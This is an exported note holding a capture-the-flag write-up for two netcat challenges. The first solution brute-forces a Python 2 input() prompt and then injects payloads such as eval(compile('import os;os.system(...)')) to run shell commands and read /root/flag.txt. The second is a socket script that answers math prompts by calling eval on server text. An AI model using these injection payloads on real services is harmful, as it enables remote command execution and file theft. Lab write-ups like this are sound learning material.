<html>
<head>
  <title>PROGRAMMING</title>
  <basefont face="Segoe UI" size="2" />
  <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
  <meta name="exporter-version" content="Evernote Windows/308919 (en-US, DDL); Windows/6.3.0 (Win64);"/>
  <style>
    body, td {
      font-family: Segoe UI;
      font-size: 10pt;
    }
  </style>
</head>
<body>
<a name="5060"/>
<h1>PROGRAMMING</h1>

<div>
<span><div><div><div><font style="font-size: 14pt;"><span style="font-size: 14pt; font-weight: bold;">Input   :</span></font><span style="font-weight: bold; font-size: 14pt;">Connect Using below details and find me ;)</span><br/></div><div><font style="font-size: 14pt;"><span style="font-size: 14pt; font-weight: bold;">nc</span> <a href="http://docker.h4x0rbox.com/" style="font-size: 14pt; font-weight: bold; color: rgb(45, 79, 201);">docker.h4x0rbox.com</a> <span style="font-size: 14pt; font-weight: bold;">5010</span></font></div><div><br/></div><div><img src="PROGRAMMING_files/Image.png" type="image/png" data-filename="Image.png" width="558"/></div><div><span style="font-weight: bold;">So i took a dumb step of just doing bruteforce with Numeric wordlists!!   -_-</span></div><div><br/></div><div><span style="font-weight: bold;">i made this script :</span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><b><font color="#7600D8">while read line; do echo -e -n &quot;\n$line : &quot;; echo $line| nc docker.h4x0rbox.com 5010| grep Lost|| sleep 3600; done &lt; numonly.txt</font></b></div></div><div><span style="font-weight: bold;">But it went on forever!! And no success!</span></div><div><br/></div><div><span style="font-weight: bold;">Then i started looking into the input:</span> <span style="font-weight: bold; color: rgb(188, 0, 88);">And found out that it was vulnerable!!</span></div><div><a href="https://intx0x80.blogspot.com/2017/05/python-input-vulnerability_25.html" style="font-weight: bold;">https://intx0x80.blogspot.com/2017/05/python-input-vulnerability_25.html</a></div><div><a href="https://www.matthewcantelon.ca/blog/sha2017-junior-ctf-small/" style="font-weight: bold; color: rgb(45, 79, 201);">https://www.matthewcantelon.ca/blog/sha2017-junior-ctf-small/</a></div><div><br/></div><div><span style="font-weight: bold; font-size: 12pt;">python input vulnerability : </span> <span style="font-weight: bold; font-size: 12pt; color: rgb(118, 0, 216);">present in python version 2</span></div><div><span style="font-weight: bold; color: rgb(123, 0, 61); font-size: 10pt;">This vulnerability can lead to R.C.E(Remote code Execution)</span></div><div><font style="font-size: 10pt;"><br/></font></div><div><span style="font-weight: bold; font-size: 10pt;">Test Cases:</span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div style="color: rgb(79, 0, 154);"><b>eval(compile('print(&quot;flag&quot;)', '&lt;string&gt;', 'exec'))</b></div><div style="color: rgb(79, 0, 154);"><b>int(eval(compile('print &quot;password&quot;', '&lt;string&gt;', 'exec')) or 0)</b></div><div style="color: rgb(79, 0, 154);"><div><b><br/></b></div><div><b><br/></b></div></div><div style="color: rgb(79, 0, 154);"><b>eval(compile('import os;os.system(&quot;uname -a&quot;) ', '&lt;string&gt;', 'exec'))</b></div><div style="color: rgb(79, 0, 154);"><b>eval(compile('import os;os.system(&quot;ls *&quot;) ', '&lt;string&gt;', 'exec'))</b></div><div><b><font style="color: rgb(227, 0, 0);">eval(compile('import os;os.system(&quot;cat /root/flag.txt&quot;) ', '&lt;string&gt;', 'exec'))</font></b></div></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 14pt;"><span style="font-size: 14pt; font-weight: bold;">POC : </span></font></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font><font><b><font color="#E30000" style="font-size: 10pt;">eval(compile('import os;os.system(&quot;cat /root/flag.txt&quot;) ', '&lt;string&gt;', 'exec'))</font></b></font></font></div></div><div><img src="PROGRAMMING_files/Image [1].png" type="image/png" data-filename="Image.png"/></div><div><br/></div><div><font style="font-size: 14pt;"><span style="font-size: 14pt; font-weight: bold;">FLAG :</span><span style="font-size: 14pt; font-weight: bold; color: rgb(118, 0, 216);"> </span><span style="font-size: 14pt; font-weight: bold; color: rgb(227, 0, 0);">SL7{pYTH0n2_1npUt_PWN!}</span></font></div><div><br/></div><hr/><div><span style="font-size: 14pt; font-weight: bold;">Math  :   Have You done YOur Homework?</span></div><div><span style="font-size: 14pt; font-weight: bold;">               nc</span> <a href="http://docker.h4x0rbox.com/" style="font-size: 14pt; font-weight: bold;">docker.h4x0rbox.com</a> <span style="font-size: 14pt; font-weight: bold;">5020</span></div><div><font style="font-size: 14pt;"><br/></font></div></div><div><span style="font-size: 10pt; color: rgb(118, 0, 216); font-weight: bold;">After many trial and errors finally did it!!</span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><b><font color="#BC0058">#!/usr/bin/python3</font></b></div><div><b><font color="#BC0058"><br/></font></b></div><div><b><font color="#BC0058"><br/></font></b></div><div><b><font color="#BC0058">import socket</font></b></div><div><b><font color="#BC0058">from time import sleep</font></b></div><div><b><font color="#BC0058"><br/></font></b></div><div><b><font color="#BC0058"><br/></font></b></div><div><b><font color="#BC0058">if __name__ == '__main__':</font></b></div><div><b><font color="#BC0058">    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</font></b></div><div><b><font color="#BC0058">    client.connect(('10.10.10.201', 5020))</font></b></div><div><b><font color="#BC0058">    client.settimeout(2)</font></b></div><div><b><font color="#BC0058">    </font></b></div><div><b><font color="#BC0058">    counter=1</font></b></div><div><b><font color="#BC0058">    </font></b></div><div><b><font color="#BC0058">    while True:</font></b></div><div><b><font color="#BC0058">        </font></b></div><div><b><font color="#BC0058">        chunk =b''</font></b></div><div><b><font color="#BC0058">        response=b''</font></b></div><div><b><font color="#BC0058">      </font></b></div><div><b><font color="#BC0058">        </font></b></div><div><b><font color="#BC0058">        if counter==1:</font></b></div><div><b><font color="#BC0058">            counter = 0  # to make it run for first time only</font></b></div><div><b><font color="#BC0058">            while True:</font></b></div><div><b><font color="#BC0058">                try:</font></b></div><div><b><font color="#BC0058">                    chunk = chunk+(client.recv(4096))</font></b></div><div><b><font color="#BC0058">                    if (chunk.decode('utf-8')).split()[14]=='x':</font></b></div><div><b><font color="#BC0058">                        expression=(chunk.decode('utf-8')).split()[13]</font></b></div><div><b><font color="#BC0058">                        result=eval(expression)</font></b></div><div><b><font color="#BC0058">                        print(chunk.decode('utf-8'))</font></b></div><div><b><font color="#BC0058">                        print(result)</font></b></div><div><b><font color="#BC0058">        </font></b></div><div><b><font color="#BC0058">                        data = str(result).encode('utf-8') + b'\n'         #encode and send</font></b></div><div><b><font color="#BC0058">                        client.send(data)</font></b></div><div><b><font color="#BC0058">                        break</font></b></div><div><b><font color="#BC0058">                    </font></b></div><div><b><font color="#BC0058">                except (socket.timeout, IndexError):</font></b></div><div><b><font color="#BC0058">                    print(&quot;Timeout_or_Index_error----But---Will----Continue&quot;)</font></b></div><div><b><font color="#BC0058">                    continue</font></b></div><div><b><font color="#BC0058">                </font></b></div><div><b><font color="#BC0058">                     </font></b></div><div><b><font color="#BC0058">                                                     </font></b></div><div><b><font color="#BC0058">            </font></b></div><div><b><font color="#BC0058">        </font></b></div><div><b><font color="#BC0058">        print(&quot;----------------------------------------------OTHER PART---------------------------------------&quot;)    </font></b></div><div><b><font color="#BC0058"><br/></font></b></div><div><b><font color="#BC0058"><br/></font></b></div><div><b><font color="#BC0058">        while True:</font></b></div><div><b><font color="#BC0058">            try:</font></b></div><div><b><font color="#BC0058">                response = response+(client.recv(4096))</font></b></div><div><b><font color="#BC0058">                if (response.decode('utf-8')).split()[7]=='x':</font></b></div><div><b><font color="#BC0058">                        expression=(response.decode('utf-8')).split()[6]</font></b></div><div><b><font color="#BC0058">                        result=eval(expression)</font></b></div><div><b><font color="#BC0058">                        print(response.decode('utf-8'))</font></b></div><div><b><font color="#BC0058">                        print(result)</font></b></div><div><b><font color="#BC0058">                        </font></b></div><div><b><font color="#BC0058">                        data = str(result).encode('utf-8') + b'\n'         #encode and send then break for next round</font></b></div><div><b><font color="#BC0058">                        client.send(data)</font></b></div><div><b><font color="#BC0058">                        if(response.decode('utf-8')).split()[3]=='522':</font></b></div><div><b><font color="#BC0058">                            getfinalresponse = client.recv(4096)</font></b></div><div><b><font color="#BC0058">                            print(getfinalresponse.decode('utf-8'))</font></b></div><div><b><font color="#BC0058">                            sleep(10000)</font></b></div><div><b><font color="#BC0058">                            break</font></b></div><div><b><font color="#BC0058">                        break                                            </font></b></div><div><b><font color="#BC0058">                        </font></b></div><div><b><font color="#BC0058">                                        </font></b></div><div><b><font color="#BC0058">                        </font></b></div><div><b><font color="#BC0058">            except (socket.timeout, IndexError):</font></b></div><div><b><font color="#BC0058">                print(&quot;OTHER_PART_Timeout_and_IndexERROR----But---Will----Continue&quot;)</font></b></div><div><b><font color="#BC0058">                continue</font></b></div><div><b><font color="#BC0058">    </font></b></div></div><div><br/></div><div><span style="font-size: 14pt; font-weight: bold;">POC:</span></div><div><img src="PROGRAMMING_files/Image [2].png" type="image/png" data-filename="Image.png"/></div><div><br/></div><div><span style="font-size: 14pt; font-weight: bold;">FLAG : </span><span style="font-size: 14pt; color: rgb(255, 0, 0); font-weight: bold;">SL7{MaTHl0V3R!}</span></div><div><font style="font-size: 14pt;"><br/></font></div><hr/><div><br/></div><div><br/></div></div><div><br/></div></span>
</div></body></html> 